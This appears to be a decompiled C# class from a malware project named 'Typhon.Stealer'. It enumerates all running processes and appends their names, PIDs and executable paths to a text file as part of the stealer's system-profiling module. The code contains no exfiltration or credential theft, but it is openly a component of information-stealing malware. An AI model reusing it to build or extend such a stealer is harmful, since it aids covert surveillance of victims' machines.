using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace Typhon.Stealer.SystemInfo
{
	// Token: 0x02000009 RID: 9
	internal class SaveRunningProcess
	{
		// Token: 0x06000025 RID: 37 RVA: 0x000033BC File Offset: 0x000015BC
		public static void WriteProcessList(string sSavePath)
		{
			foreach (Process process in Process.GetProcesses())
			{
				File.AppendAllText(sSavePath + "\\Running Processes.txt", string.Concat(new string[]
				{
					"Process name: ",
					process.ProcessName,
					"\n\tPID: ",
					process.Id.ToString(),
					"\n\tExecutable path: ",
					SaveRunningProcess.GetProcessExecutablePath(process),
					"\n=================\n\n"
				}));
			}
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00003440 File Offset: 0x00001640
		public static string GetProcessExecutablePath(Process process)
		{
			try
			{
				return process.MainModule.FileName;
			}
			catch
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					object obj = managementObject["ProcessID"];
					object obj2 = managementObject["ExecutablePath"];
					if (obj2 != null && obj.ToString() == process.Id.ToString())
					{
						return obj2.ToString();
					}
				}
			}
			return "";
		}
	}
}
